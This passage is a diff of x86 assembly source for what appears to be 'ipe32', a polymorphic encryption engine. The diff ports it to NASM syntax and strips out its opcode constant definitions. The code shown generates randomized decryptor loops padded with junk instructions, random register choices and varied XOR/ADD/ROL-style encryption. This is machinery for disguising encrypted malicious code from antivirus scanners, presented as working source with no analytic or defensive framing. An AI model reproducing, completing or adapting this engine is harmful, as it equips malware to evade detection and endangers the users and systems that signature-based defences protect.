                 xor   esi, esi                        ; displacement
                 ret
 
@@ -1462,7 +1789,7 @@ iGetWrMem:
                 push  eax
                 push  GM_METHCNT3 - 1
                 call  rnd32r
-                mov   eax, [ebp.gm_methods-idelta+4+4*eax]
+                mov   eax, [ebp+gm_methods-idelta+4+4*eax]
                 add   eax, ebp
                 call  eax
                 pop   eax
@@ -1479,7 +1806,7 @@ iGetPar:
 iGetJunkReg:
                 push  0x03
                 call  rnd32r
-                movzx eax, byte [ebp.junkreg1-idelta+eax]
+                movzx eax, byte [ebp+junkreg1-idelta+eax]
                 ret
 ;iGetJunkReg     endp
 
@@ -1487,7 +1814,7 @@ iPushJunk:
                 pushad
                 push  PP_METHCNT                ; random method to push
                 call  rnd32r                    ; a parameter
-                mov   eax, [ebp.pp_methods-idelta+4*eax]
+                mov   eax, [ebp+pp_methods-idelta+4*eax]
                 add   eax, ebp
                 call  eax                       ; call da method
                 mov   [esp], edi
@@ -1569,7 +1896,7 @@ pj_sueder:      mov   al, OPSIZE_32
 rnd32:          ; [no parameterz]
                 push  ecx
                 push  edx
-                mov   eax, [ebp.RandomSeed-idelta] ; load random seed
+                mov   eax, [ebp+RandomSeed-idelta] ; load random seed
                 mov   ecx, eax
                 mov   edx, eax
                 not   ecx
@@ -1585,7 +1912,7 @@ rnd32_loop:     push  ecx
                 pop   ecx
 rnd32_blah:     loop  rnd32_loop
                 xor   eax, edx
-                mov   [ebp.RandomSeed-idelta], eax ; write back random seed
+                mov   [ebp+RandomSeed-idelta], eax ; write back random seed
                 pop   edx
                 pop   ecx
                 ret
@@ -1608,7 +1935,7 @@ rnd32r:         ; [range]
 ; 'xchanges n bytes from address ESI (n has to be pushed)
 MixBytes:       ; [count] [esi = ptr]
                 pushad                    ; preserve all registers
-                mov   ebx, [esp.PUSHAD_SIZE+0x04]
+                mov   ebx, [esp+PUSHAD_SIZE+0x04]
                 mov   ecx, ebx
                 shl   ecx, 0x01            ; loop counter (2 * # of bytes)
 
@@ -1645,12 +1972,12 @@ wj_loop:        call  rnd32               ; get a random byte
 
 ; returns reg if it is a junk reg, otherwise -1
 iIsJReg:
-                mov   eax, [esp.0x04]
-                cmp   [ebp.junkreg1-idelta], al
+                mov   eax, [esp+0x04]
+                cmp   [ebp+junkreg1-idelta], al
                 je    is_junkreg
-                cmp   [ebp.junkreg2-idelta], al
+                cmp   [ebp+junkreg2-idelta], al
                 je    is_junkreg
-                cmp   [ebp.junkreg3-idelta], al
+                cmp   [ebp+junkreg3-idelta], al
                 je    is_junkreg
                 xor   eax, eax
                 dec   eax
@@ -1809,7 +2136,7 @@ glr_notword:    inc   eax
 
                 push  GLR_METHCNT       ; choose between some methods
                 call  rnd32r
-                mov   eax, [ebp.glr_methods-idelta+eax*4] ; load method
+                mov   eax, [ebp+glr_methods-idelta+eax*4] ; load method
                 add   eax, ebp          ; relocate pointer to subroutine
                 jmp   eax               ; jump to method.
 
@@ -1914,8 +2241,8 @@ glr_methods:
 RelLongJmp:     ; [address], [address of disp]
                 push  eax
                 push  edi
-                mov   eax, [esp.0x0C]        ; where to jump
-                mov   edi, [esp.0x10]        ; address of displacement
+                mov   eax, [esp+0x0C]        ; where to jump
+                mov   edi, [esp+0x10]        ; address of displacement
                 neg   edi
                 lea   eax, [eax+edi-0x04]
                 neg   edi
@@ -2436,9 +2763,8 @@ JunkGen         dd     iMemJunk - idelta
 CallOrder1      db    LOAD_POINTER               ; ┐
                 db    LOAD_COUNTER               ; ├ these procedures can
                 db    LOAD_KEY                   ; ┘ be mixed.
-%define CALL_ORDER_1     $ - CallOrder1
+CallOrder1_e:                
                 db    DECRYPT_DATA      ; stays at its place
-%define CALL_ORDER_2     $ - CallOrder1
 CallOrder2      db    INC_KEY                    ; ┐
                 db    INC_POINTER                ; ├ these procedures can
                 db    DEC_COUNTER                ; │ be mixed.
@@ -2455,7 +2781,7 @@ ProcedureOrder  db    LOAD_POINTER
                 db    DEC_COUNTER
                 db    FPU_FOOL
                 times JUNK_PROCS db    JUNK_PROC
-%define PROC_ORDER       $ - ProcedureOrder
+ProcedureOrder_e:
 
 ; registerz
 Registers:         
@@ -2465,7 +2791,7 @@ kreg            db    REG_EAX           ; key register
 junkreg1        db    REG_EBX           ; junk register 1
 junkreg2        db    REG_ESI           ; junk register 2
 junkreg3        db    REG_EDI           ; junk register 3
-%define USED_REGS        $ - Registers
+Registers_e:
 
 RandomConst     dd    RANDOM_SEED       ; random seed constant (unchanged
                                         ; during runtime)
@@ -2473,345 +2799,29 @@ idelta:                             ; delta offset (held in ebp)
 
 ; uninitialized data
 
-RandomSeed      dd    ?                 ; random seed (changed)
+RandomSeed      resd  1                 ; random seed (changed)
 
 InitValues:                         ; some values we have to initialize
-JunkSpSize      dd    ?                 ; size of junk space
-JunkSpRVA       dd    ?                 ; address of junk space
-DecryptRVA      dd    ?                 ; address of encrypted code
-CryptSize       dd    ?                 ; size of crypted code
-EncryptRVA      dd    ?                 ; address of code to encrypt
-CryptKey        dd    ?                 ; encryption key
-KeyIncrement    dd    ?                 ; key incrementation
-CryptType       db    ?                 ; encryption type (byte)
-KeyIncType      db    ?                 ; key increment type (byte)
+JunkSpSize      resd  1                 ; size of junk space
+JunkSpRVA       resd  1                 ; address of junk space
+DecryptRVA      resd  1                 ; address of encrypted code
+CryptSize       resd  1                 ; size of crypted code
+EncryptRVA      resd  1                 ; address of code to encrypt
+CryptKey        resd  1                 ; encryption key
+KeyIncrement    resd  1                 ; key incrementation
+CryptType       resb  1                 ; encryption type (byte)
+KeyIncType      resb  1                 ; key increment type (byte)
 
 ProcParameters:  resb MAX_PROCS + 1
 ProcAddress:     resd MAX_PROCS + 1
 
-JunkProcs       db    ?                 ; number of junk procedures
-ProcCount       db    ?                 ; number of procedures
+JunkProcs       resb  1                 ; number of junk procedures
+ProcCount       resb  1                 ; number of procedures
 
-CurrentProc     db    ?                 ; identifies current procedure when
+CurrentProc     resb  1                 ; identifies current procedure when
                                         ; in the generator loop.
-InLoop          db    ?                 ; boolean, if true we are
+InLoop          resb  1                 ; boolean, if true we are
                                         ; generating decryptor loop
-nojunk          db    ?
+nojunk          resb  1
 
-; encryption type constantz
-%define ENC_XOR        0b00000000             ; xor encryption
-%define ENC_ADD        0b00000001             ; add encryption
-%define ENC_SUB        0b00000010             ; sub encryption
-%define ENC_ROL        0b00000011             ; rol encryption
-%define ENC_ROR        0b00000100             ; ror encryption
-%define ENC_RND        5
-
-; key increment type constantz
-%define KEY_INC        0b00000000             ; rol key with random value
-%define KEY_DEC        0b00000001             ; ror key with random value
-%define KEY_ROL        0b00000010             ; inc key with random value
-%define KEY_ROR        0b00000011             ; dec key with random value
-%define KEY_RND        4
-; i386 instruction set constants
-; correct order of register on stack after a pushad. offset relative
-; to ESP
-%define PUSHAD_EAX       (REG_EDI - REG_EAX) * 4      ; location of EAX
-%define PUSHAD_ECX       (REG_EDI - REG_ECX) * 4      ; location of ECX
-%define PUSHAD_EDX       (REG_EDI - REG_EDX) * 4      ; location of EDX
-%define PUSHAD_EBX       (REG_EDI - REG_EBX) * 4      ; location of EBX
-%define PUSHAD_ESP       (REG_EDI - REG_ESP) * 4      ; location of ESP
-%define PUSHAD_EBP       (REG_EDI - REG_EBP) * 4      ; location of EBP
-%define PUSHAD_ESI       (REG_EDI - REG_ESI) * 4      ; location of ESI
-%define PUSHAD_EDI       (REG_EDI - REG_EDI) * 4      ; location of EDI
-%define PUSHAD_SIZE      8 * 0x04                      ; size of pushad record
-
-; dword registerz
-%define REG_EAX          0b00000000
-%define REG_ECX          0b00000001
-%define REG_EDX          0b00000010
-%define REG_EBX          0b00000011
-%define REG_ESP          0b00000100
-%define REG_EBP          0b00000101
-%define REG_ESI          0b00000110
-%define REG_EDI          0b00000111
-
-; word registerz
-%define REG_AX           0b00000000
-%define REG_CX           0b00000001
-%define REG_DX           0b00000010
-%define REG_BX           0b00000011
-%define REG_SP           0b00000100
-%define REG_BP           0b00000101
-%define REG_SI           0b00000110
-%define REG_DI           0b00000111
-
-; byte registerz
-%define REG_AL           0b00000000
-%define REG_CL           0b00000001
-%define REG_DL           0b00000010
-%define REG_BL           0b00000011
-%define REG_AH           0b00000100
-%define REG_CH           0b00000101
-%define REG_DH           0b00000110
-%define REG_BH           0b00000111
-
-; fpu registerz
-%define REG_ST0          0b00000000
-%define REG_ST1          0b00000001
-%define REG_ST2          0b00000010
-%define REG_ST3          0b00000011
-%define REG_ST4          0b00000100
-%define REG_ST5          0b00000101
-%define REG_ST6          0b00000110
-%define REG_ST7          0b00000111
-
-%define REG_RND          REG_EDI + 1
-
-; jump opcode constantz
-%define JMP_SHORT        0x0EB
-%define JMP_LONG         0x0E9
-%define JMPC_SHORT       0x070
-%define JMPC_LONG        0x080              ; 2 byte opcode!
-
-; conditions
-
-%define COND_C           0x002            ; carry
-%define COND_NC          0x003            ; no carry
-%define COND_E           0x004            ; equal                   A  = B
-%define COND_NE          0x005            ; not equal               A != B
-%define COND_Z           0x004            ; zero                    A  = B
-%define COND_NZ          0x005            ; not zero                A != B
-%define COND_S           0x008            ; sign                   msb = 1
-%define COND_NS          0x009            ; no sign                msb = 0
-%define COND_P           0x00A            ; parity even            lsb = 0
-%define COND_NP          0x00B            ; parity odd             lsb = 1
-%define COND_O           0x000            ; overflow       msb was toggled
-%define COND_NO          0x001            ; no overflow    msb wasn't toggled
-
-%define COND_B           COND_C          ; below                    A > B
-%define COND_NAE         COND_B          ; neither above or equal   A > B
-%define COND_NB          COND_NC         ; not below                A ≤ B
-%define COND_AE          COND_NB         ; above or equal           A ≤ B
-%define COND_BE          0x006            ; below or equal           A ≥ B
-%define COND_NA          COND_BE         ; not above                A ≥ B
-%define COND_NBE         0x007            ; neither below or equal   A < B
-%define COND_A           COND_NBE        ; above                    A < B
-%define COND_L           0x00C            ; less                     A > B
-%define COND_NGE         COND_L          ; neither greater or equal A > B
-%define COND_NL          0x00D            ; not less                 A ≤ B
-%define COND_GE          COND_NL         ; greater or equal         A ≤ B
-%define COND_LE          0x00E            ; less or equal            A ≥ B
-%define COND_NG          COND_LE         ; not greater              A ≥ B
-%define COND_NLE         0x00F            ; neither less or equal    A < B
-%define COND_G           COND_NLE        ; greater                  A < B
-
-; call opcode constantz
-%define CALL_DIRECT      0x0E8
-
-; procedure commands
-%define PROC_ENTER       0x0C8
-%define PROC_LEAVE       0x0C9
-%define PROC_RETP        0x0C2
-%define PROC_RET         0x0C3
-%define MOV_EBP_ESP      0x0EC8B
-
-; stack opcodes
-%define PUSH_REG         0x050                 ; xor REG_???
-%define POP_REG          0x058
-%define PUSH_IMM         0x068
-%define PUSH_IMM_SX      0x06A
-%define POP_MEM          0x08F
-
-; increment/decrement opcodes
-%define INC_REG          0x040
-%define DEC_REG          0x048
-%define INCDEC_GROUP     0x0FE
-
-; mov opcodes
-%define MOV_REG_RM       0
-%define MOV_REG_IMM      0x0B0 ; mov register, immediate
-%define MOV_REG_IMM8     0x0B0
-%define MOV_REG_IMM32    0x0B8
-%define MOV_MEM_IMM      0x0C6 ; mov memory, immediate
-
-; extended mov opcodes
-
-%define MOVX             0x0B6
-%define MOVX_BYTE        0x000
-%define MOVX_WORD        0x001
-%define MOVX_ZX          0x000
-%define MOVX_SX          0x008
-
-; load effective address
-%define LOAD_EA          0x08D
-
-; Flag set/clear commands
-%define CLR_CRY          0x0F8
-%define SET_CRY          0x0F9
-%define CLR_INT          0x0FA
-%define SET_INT          0x0FB
-%define CLR_DIR          0x0FC
-%define SET_DIR          0x0FD
-
-; Common opcode constants
-
-; prefixes
-%define ESC_2BYTE        0x0F
-%define OPERAND_SIZE     0x66
-%define ADDRESS_SIZE     0x67
-
-; segment override prefix
-%define OVERRIDE_FS      0x64
-%define OVERRIDE_GS      0x65
-
-; operand size
-%define OPSIZE_8         0x00
-%define OPSIZE_32        0x01
-%define OPSIZE_16        0x02
-
-; direction
-%define MEM_REG          0x00
-%define REG_MEM          0x01
-
-; some opcodes support direct EAX/AX/AL access
-%define USE_EAX          0x04
-
-%define XCHG_EAX_REG     0x090 ; add register number to get opcode (not eax)
-%define OP_NOP           0x090 ; very obsolete :x<
-%define TEST_EAX_IMM     0x0A8
-
-; Shift operation constants
-%define OP_SHIFT         0x0C0
-
-%define SHIFT_IMM        0x000 ; shift immediate
-%define SHIFT_1          0x001 ; shift 1 time
-%define SHIFT_CL         0x002 ; shift cl times
-%define SHIFT_RND        0x003 ; for choosing random shift.
-
-%define ROL_SHIFT        0x000
-%define ROR_SHIFT        0x001
-%define RCL_SHIFT        0x002
-%define RCR_SHIFT        0x003
-%define SHL_SHIFT        0x004
-%define SHR_SHIFT        0x005
-%define SAR_SHIFT        0x006
-%define RND_SHIFT        0x007
-
-%define OP_GROUP1        0x080 ; opcode for immediate group 1
-%define OP_GROUP3        0x0F6 ; opcode for shift group 3
-
-; jmp, call, push, inc, dec group
-%define OP_GROUP5        0x0FF ; opcode for jmpcallpushincdec group 5
-
-%define P_INC            0x000
-%define P_DEC            0x001
-%define P_CALL_NEAR      0x002  ; call dword ptr
-%define P_CALL_FAR       0x003  ; call 48-bit ptr
-%define P_JMP_NEAR       0x004  ; jmp dword ptr
-%define P_JMP_FAR        0x005  ; jmp 48-bit ptr
-%define P_PUSH           0x006
-
-; Math operation constants
-%define OPTYPE_ADD       0x00
-%define OPTYPE_OR        0x01
-%define OPTYPE_ADC       0x02
-%define OPTYPE_SBB       0x03
-%define OPTYPE_AND       0x04
-%define OPTYPE_SUB       0x05
-%define OPTYPE_XOR       0x06
-%define OPTYPE_CMP       0x07
-%define OPTYPE_MOV       0x008
-%define OPTYPE_TEST      0x009
-%define OPTYPE_XCHG      0x00A
-
-; Math opcode constants
-%define MATH_ADD         OPTYPE_ADD shl 0x03
-%define MATH_OR          OPTYPE_OR  shl 0x03
-%define MATH_ADC         OPTYPE_ADC shl 0x03
-%define MATH_SBB         OPTYPE_SBB shl 0x03
-%define MATH_AND         OPTYPE_AND shl 0x03
-%define MATH_SUB         OPTYPE_SUB shl 0x03
-%define MATH_XOR         OPTYPE_XOR shl 0x03
-%define MATH_CMP         OPTYPE_CMP shl 0x03
-
-; Immediate opcode constants
-%define IMM_OP           0x80
-%define IMM_SX           0x03               ; sign extended immediate
-
-; MOD/RM constants
-
-; MOD bits
-%define MOD_NODISP       0x000                  ; no displacement
-%define MOD_DISP8        0x040                  ; 8-bit displacement
-%define MOD_DISP32       0x080                  ; 32-bit displacement
-%define MOD_REG          0x0C0                  ; register
-%define _MOD             0b011000000            ; mask for MOD-field
-
-%define MOD_DIRECT       0b00001000                 ; use immediate address
-%define MOD_SIB          0b00010000                 ; use sib byte
-
-; REG bits
-%define _REG             0b000111000            ; mask for REG-field
-
-; RM bits
-%define RM_DIRECT        REG_EBP xor MOD_NODISP
-%define RM_SIB           REG_ESP
-%define _RM              0b000000111            ; mask for RM field
-
-; FPU opcodes
-
-%define FPU_OPCODE       0x0D8
-%define FPU_DWORD_OP     0x0D8   ; dword ops/fpu reg ops
-%define FPU_DWORD_LDST   0x0D9   ; group 1 - 4, FLD, FST, ...
-%define FPU_INT_OP       0x0DA   ; dword operations
-%define FPU_INT_LDST     0x0DB   ; group 5, FILD, FIST
-%define FPU_QWORD_OP     0x0DC   ; qword ops/fpu reg ops
-%define FPU_QWORD_LDST   0x0DD   ; qword FILD, FIST
-%define FPU_WORD_OP      0x0DE   ; word ops (only mem), and reversed arithmetix
-%define FPU_WORD_LDST    0x0DF   ; word FILD, FIST
-
-; FPU opcode + MOD/RM (bl = FPU_FMUL, FDIV...)
-;
-; they'll fit to the following opcodez:
-; FPU_DWORD_OP, FPU_QWORD_OP & FPU_WORD_OP
-; IMPORTANT: note that the word operations won't work with fpu registers!
-
-%define FPU_ADD         0b000                   ; MOD/RM bit 3,4,5 = 001
-%define FPU_MUL         0b001
-%define FPU_CMP         0b010
-%define FPU_COMP        0b011
-%define FPU_SUB         0b100
-%define FPU_SUBR        0b101
-%define FPU_DIV         0b110
-%define FPU_DIVR        0b111
-
-; FPU_WORD_OP group contains some opcodes with reversed register order.
-; this means first comes st(?) and then the first register.
-%define FPU_ADDP        0b000                   ; MOD/RM bit 3,4,5 = 001
-%define FPU_MULP        0b001
-%define FPU_COMPP       0b011
-%define FPU_SUBRP       0b100
-%define FPU_SUBP        0b101
-%define FPU_DIVRP       0b110
-%define FPU_DIVP        0b111
-
-%define FPU_DIR1         0x000                     ; direction st, st(?)
-%define FPU_DIR2         0x004                     ; direction st(?), st
-
-; FPU stand alone instructions
-%define FPU_INIT         0x0E3DB
-%define FPU_SQRT         0x0FAD9
-
-%define FPU_LD1          0x0E8D9
-%define FPU_LDL2T        0x0E9D9
-%define FPU_LDL2E        0x0EAD9
-%define FPU_LDPI         0x0EBD9
-%define FPU_LDLG2        0x0ECD9
-%define FPU_LDLN2        0x0EDD9
-%define FPU_LDZ          0x0EED9
-
-%define FPU_WAIT         0x09B
-
-%define FPU_STORE        0x02
-%define FPU_LOAD         0x00
 ; end of ipe32
